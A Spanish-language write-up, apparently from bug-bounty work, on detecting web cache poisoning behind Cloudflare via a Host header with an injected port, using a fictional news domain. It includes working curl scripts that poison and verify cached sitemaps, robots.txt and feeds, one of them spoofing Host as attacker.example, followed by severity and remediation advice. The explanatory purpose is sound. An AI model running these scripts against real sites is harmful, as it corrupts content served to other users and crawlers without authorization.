## Introducción

Web Cache Poisoning ocurre cuando un atacante consigue que una capa de caché almacene una respuesta contaminada y luego esa misma respuesta es servida a usuarios, crawlers o sistemas legítimos. En otras palabras, el problema no es solo que una aplicación refleje un valor controlado por el usuario, sino que esa reflexión termine guardada en caché y sea reutilizada en futuras respuestas.

Un error común durante el análisis es asumir que, si un sitio está detrás de Cloudflare y la cabecera indica `cf-cache-status: DYNAMIC`, entonces no existe riesgo de cache poisoning. Esa interpretación es incompleta.

`cf-cache-status: DYNAMIC` solo indica que Cloudflare no sirvió esa respuesta desde su propia caché. No significa necesariamente que no exista otra capa de caché detrás, como un reverse proxy, Nginx, Varnish, una caché de aplicación o una regla interna del origin.

El punto clave es este:

```text
Cloudflare delante ≠ Cloudflare es la única caché
cf-cache-status: DYNAMIC ≠ no hay caché
x-cache-status: HIT ≠ Cloudflare HIT
```

Este artículo muestra cómo analizar un caso de Web Cache Poisoning limitado en endpoints públicos de indexación, usando un dominio ficticio: `example-news-site.com`.
## Modelo mental del flujo

En una arquitectura moderna, el tráfico no siempre llega directamente a la aplicación. Puede pasar por varias capas:

```text
Usuario / Crawler
      ↓
Cloudflare
      ↓
Reverse Proxy / Origin Cache
      ↓
Backend Application
```

Esto significa que una respuesta puede no estar cacheada por Cloudflare, pero sí por una capa posterior.

Por ejemplo:

```http
cf-cache-status: DYNAMIC
x-cache-status: HIT
```

La lectura correcta sería:

|Cabecera|Interpretación|
|---|---|
|`cf-cache-status: DYNAMIC`|Cloudflare no sirvió la respuesta desde caché|
|`x-cache-status: HIT`|Otra capa de caché sí sirvió una respuesta cacheada|
|`x-cache-status: MISS`|Esa capa generó o almacenó una nueva respuesta|
|`x-cache-status: HIT` después de un request limpio|Posible evidencia de respuesta contaminada servida desde caché|

Por eso, durante una prueba de Web Cache Poisoning, no basta con mirar una sola cabecera. Hay que entender qué capa está cacheando realmente.

## La idea del ataque

El escenario probado fue un endpoint público de indexación, como un sitemap, un feed XML o un archivo usado por crawlers.

Ejemplos de rutas:

```text
https://example-news-site.com/sitemap.xml
https://example-news-site.com/robots.txt
https://example-news-site.com/feed/googlenews/googlenews.xml
```

Estos endpoints suelen ser interesantes porque pueden ser consumidos por buscadores, indexadores, agregadores de noticias o sistemas automatizados.

La hipótesis fue:

> Si la aplicación construye URLs absolutas usando el valor del header `Host`, y esa respuesta se guarda en caché, entonces un atacante podría contaminar temporalmente URLs expuestas en endpoints públicos.


## Ejemplo de validación

- El primer `curl` es el request POISON porque envía el header `Host: example-news-site.com:31077`. 
- El segundo `curl` es el request CLEAN porque usa la misma URL, pero ya no envía el header `Host` modificado. 
- Si la respuesta CLEAN sigue mostrando `example-news-site.com:31077` y además aparece `x-cache-status: HIT`, entonces la respuesta contaminada fue servida desde una capa de caché.

```bash
# 1. Preparar el Host contaminado y la URL de prueba
MARK="example-news-site.com:31077"
P="/feed/googlenews/googlenews.xml"
B="bbh$(date +%s)"
U="https://example-news-site.com${P}?${B}=1"

# 2. Enviar un request malicioso con Host modificado
curl -sk --compressed -D /tmp/p_headers.txt -H "Host: $MARK" "$U" -o /tmp/p_body.txt

# 3. Confirmar que la respuesta POISON refleja el valor inyectado
echo "[POISON]"
grep -Eim3 '^HTTP/|^x-cache-status:|^cf-cache-status:' /tmp/p_headers.txt
grep -aom1 'example-news-site\.com:[0-9]\+' /tmp/p_body.txt || echo NO_REFLECT_POISON

# 4. Esperar brevemente antes de enviar el request limpio
sleep 2

# 5. Enviar un segundo request limpio, sin el Host malicioso
curl -sk --compressed -D /tmp/c_headers.txt "$U" -o /tmp/c_body.txt

# 6. Verificar si el contenido contaminado sigue apareciendo en la respuesta limpia
echo "[CLEAN]"
grep -Eim3 '^HTTP/|^x-cache-status:|^cf-cache-status:' /tmp/c_headers.txt
grep -aom1 'example-news-site\.com:[0-9]\+' /tmp/c_body.txt || echo NO_REFLECT_CLEAN
```

Resultado esperado en un caso vulnerable:

```text
[POISON]
HTTP/2 200
x-cache-status: MISS
cf-cache-status: DYNAMIC
example-news-site.com:31077

[CLEAN]
HTTP/2 200
x-cache-status: HIT
cf-cache-status: DYNAMIC
example-news-site.com:31077
```

La lectura correcta es importante:

```text
POISON → x-cache-status: MISS → respuesta generada con valor contaminado
CLEAN  → x-cache-status: HIT  → respuesta contaminada servida desde caché
```

Aunque Cloudflare reporta `DYNAMIC`, el finding sigue siendo válido porque la caché involucrada no es Cloudflare. La evidencia relevante es `x-cache-status: HIT`

## Por qué `cf-cache-status: DYNAMIC` no invalida el finding

Este fue el punto más importante del análisis. A primera vista, alguien podría decir:

> “Cloudflare dice DYNAMIC, entonces no hay cache poisoning.”

Pero esa conclusión sería incorrecta. `cf-cache-status: DYNAMIC` solo habla de Cloudflare. No habla necesariamente de la caché del origin, del reverse proxy o de la aplicación. En este caso, la evidencia relevante era:

```http
x-cache-status: MISS
x-cache-status: HIT
```

Eso indica que otra capa estaba manejando caché. Por tanto, el finding no debería describirse como:

```text
Cloudflare Cache Poisoning
```

La descripción correcta sería:

```text
Origin-side Web Cache Poisoning
```

O también:

```text
Reverse-proxy/application cache poisoning behind Cloudflare
```

Esta diferencia importa mucho en un reporte, porque evita atribuir incorrectamente la vulnerabilidad al CDN visible.

## Confirmación de alcance

Después de confirmar el comportamiento en una ruta, se debe validar si el problema afecta a otros endpoints públicos.

Ejemplo:

```bash
MARK="example-news-site.com:31077"
B="bbh$(date +%s)"

for P in "/sitemap.xml" "/robots.txt" "/feed/googlenews/googlenews.xml"; do
  U="https://example-news-site.com${P}?${B}=1"
  curl -sk --compressed -H "Host: $MARK" "$U" -o /tmp/p.xml
  sleep 1
  curl -sk --compressed "$U" -o /tmp/c.xml
  R=$(grep -aom1 'example-news-site\.com:[0-9]\+' /tmp/c.xml || echo "NO_POISON")
  echo "$P -> $R"
done
```

Ejemplo de resultado:

```text
/sitemap.xml -> example-news-site.com:31077
/robots.txt -> example-news-site.com:31077
/feed/googlenews/googlenews.xml -> example-news-site.com:31077
```

Esto indica que el comportamiento no está limitado a una sola ruta aislada, sino que puede afectar varios endpoints públicos de indexación.

## Validación de persistencia

Un reflejo aislado no es suficiente para confirmar Web Cache Poisoning. La respuesta contaminada debe persistir durante algún tiempo sin reenviar el header malicioso.

Ejemplo:

```bash
for i in 1 2 3 4; do
  sleep 10
  curl -sk "https://example-news-site.com/feed/googlenews/googlenews.xml?cachebuster=1" | grep -o 'example-news-site.com:[0-9]*' | head -1
  echo "--- t+$((i*10))s ---"
done
```

Ejemplo de resultado:

```text
example-news-site.com:31077
--- t+10s ---
example-news-site.com:31077
--- t+20s ---
example-news-site.com:31077
--- t+30s ---
example-news-site.com:31077
--- t+40s ---
```

Esto demuestra que la respuesta contaminada siguió siendo servida durante una ventana temporal, sin necesidad de reenviar el header malicioso.

## Confirmación de límites

Una buena prueba no solo demuestra impacto. También define límites.

```bash
# 1. Preparar cache buster para las pruebas de límite
B="bbh$(date +%s)"

# 2. Validar si la URL limpia sin query estaba afectada
echo "[clean no-query]"
curl -sk "https://example-news-site.com/feed/googlenews/googlenews.xml" | grep -aom1 'example-news-site\.com:[0-9]\+' || echo NO_PORT_IN_CLEAN_URL

# 3. Validar si era posible reemplazar completamente el host por un dominio externo
echo "[full host replacement]"
curl -sk --compressed -D /tmp/full_h.txt -H "Host: attacker.example" "https://example-news-site.com/feed/googlenews/googlenews.xml?${B}=1" -o /tmp/full_b.txt
grep -Eim1 '^HTTP/' /tmp/full_h.txt
grep -aom1 'attacker\.example' /tmp/full_b.txt || echo NO_FULL_HOST_REFLECTION

# 4. Validar si una ruta sensible como password reset reflejaba el valor contaminado
echo "[sensitive path]"
curl -sk --compressed -H "Host: example-news-site.com:31077" "https://example-news-site.com/password/reset?${B}=1" | grep -aom1 'example-news-site\.com:[0-9]\+' || echo NO_SENSITIVE_REFLECTION
```

Ejemplo de resultado:

```text
[clean no-query]
NO_PORT_IN_CLEAN_URL

[full host replacement]
HTTP/2 403
NO_FULL_HOST_REFLECTION

[sensitive path]
NO_SENSITIVE_REFLECTION
```

Estas pruebas sirven para delimitar el impacto. Primero se valida que la URL limpia sin query no esté contaminada. Luego se comprueba si el backend permite reemplazar completamente el host por un dominio externo. Finalmente, se prueba una ruta sensible como `/password/reset` para confirmar si el valor contaminado también aparece fuera de los endpoints públicos de indexación. Si los resultados devuelven `NO_PORT_IN_CLEAN_URL`, `NO_FULL_HOST_REFLECTION` y `NO_SENSITIVE_REFLECTION`, el impacto queda limitado a endpoints cacheados específicos y no a una toma de control general del host o rutas sensibles.


## Severidad

La severidad dependerá del contexto, pero en un caso limitado como este normalmente estaría entre Low y Medium.

Una clasificación razonable sería:

```text
Severity: Low to Medium
```

Low si:

```text
- Solo afecta endpoints públicos.
- Solo permite inyectar un puerto sobre el host legítimo.
- No afecta páginas HTML visitadas por usuarios.
- No permite redirección externa.
- No impacta rutas sensibles.
```

Medium podría justificarse si:

```text
- Afecta endpoints altamente consumidos por crawlers.
- El sitio depende fuertemente de indexación.
- La contaminación persiste durante más tiempo.
- El impacto SEO o de integridad de feeds es relevante para el negocio.
```

## Root cause probable

La causa raíz suele estar en una combinación de dos factores:

```text
1. La aplicación usa el header Host para construir URLs absolutas.
2. Una capa de caché almacena la respuesta sin considerar que fue generada con un Host no confiable.
```

Ejemplo vulnerable conceptual:

```text
Request:
Host: example-news-site.com:31077

Generated URL:
https://example-news-site.com:31077/feed/article.xml

Cached response:
Stored and later served to clean users
```

El problema no es solo reflejar el `Host`. El problema aparece cuando esa respuesta generada con datos no confiables se guarda y se reutiliza.

## Recomendaciones de remediación

La defensa debe aplicarse en varias capas.

### 1. Validar el header Host

La aplicación debería aceptar únicamente hosts esperados. Ejemplo conceptual:

```text
Allowed hosts:
- example-news-site.com
- www.example-news-site.com
```

Cualquier otro valor debería ser rechazado o normalizado.

### 2. Rechazar puertos inesperados

Si el sitio no necesita recibir hosts con puerto explícito, valores como este deberían ser rechazados:

```text
example-news-site.com:31077
```

### 3. No construir URLs absolutas desde Host no confiable

Para sitemaps, feeds y robots, es preferible usar un valor canónico configurado del lado servidor.

Ejemplo:

```text
CANONICAL_URL=https://example-news-site.com
```

En vez de construir URLs directamente desde:

```text
Host: <user-controlled-value>
```

### 4. Revisar la clave de caché

La capa de caché debe evitar almacenar respuestas generadas con headers no confiables o debe incluir correctamente los elementos relevantes en la cache key.

Si el contenido cambia según `Host`, entonces `Host` debe formar parte de la lógica de seguridad de la caché. Si no debería cambiar según `Host`, entonces el valor debe ser ignorado o normalizado antes de generar la respuesta.

### 5. Evitar cachear respuestas inconsistentes

Endpoints como sitemaps, feeds XML y robots deberían generarse con valores canónicos y cachearse solo cuando la respuesta sea segura y estable.

### 6. Agregar pruebas de regresión

Una prueba de regresión simple debería validar:

```text
1. Request con Host malicioso.
2. Request limpio posterior.
3. Confirmar que el valor malicioso no aparece en la respuesta limpia.
4. Confirmar que rutas sensibles no reflejan Host modificado.
5. Confirmar que la caché no almacena respuestas contaminadas.
```

## Conclusión

La lección principal es que `cf-cache-status: DYNAMIC` no significa automáticamente que no exista riesgo de Web Cache Poisoning. Solo significa que Cloudflare no sirvió esa respuesta desde su propia caché.

Si otra cabecera como `x-cache-status` muestra un flujo `MISS → HIT`, y un request limpio recibe contenido previamente contaminado, entonces el finding puede seguir siendo válido. La diferencia es que el problema debe describirse correctamente como cache poisoning en una capa interna, como el reverse proxy, origin cache o caché de aplicación.

La parte más importante no es encontrar una reflexión del header `Host`. La parte importante es demostrar que esa reflexión cruza el límite entre un request malicioso y una respuesta limpia servida desde caché.

En resumen:

```text
cf-cache-status: DYNAMIC → Cloudflare no cacheó.
x-cache-status: HIT → otra capa sí cacheó.
POISON → CLEAN con contenido contaminado → Web Cache Poisoning confirmado.
```

El resultado es un caso de Web Cache Poisoning limitado, con impacto principalmente sobre integridad de endpoints públicos de indexación, como sitemaps, robots y feeds XML. Aunque no implique account takeover ni redirección externa, sigue siendo una debilidad relevante cuando afecta contenido consumido por crawlers, buscadores o sistemas automatizados.